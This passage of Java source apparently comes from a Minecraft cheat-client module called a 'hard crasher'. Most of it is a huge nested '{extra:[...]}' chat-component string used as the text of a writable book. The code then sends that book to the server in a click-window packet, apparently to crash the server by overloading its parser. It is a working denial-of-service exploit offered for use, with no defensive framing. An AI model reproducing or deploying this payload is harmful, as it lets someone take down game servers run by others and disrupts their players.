{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
         }

         comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
         comp.setString("title", "oneClickHardCrasherBookEdit");
         comp.setByte("resolved", (byte) 1);
         comp.setTag("pages", list);
         ItemStack stack = new ItemStack(Items.writable_book);
         stack.setTagCompound(comp);
         PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
         buffer.writeItemStackToBuffer(stack);
         Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
     }
  toggle();
 }
 }















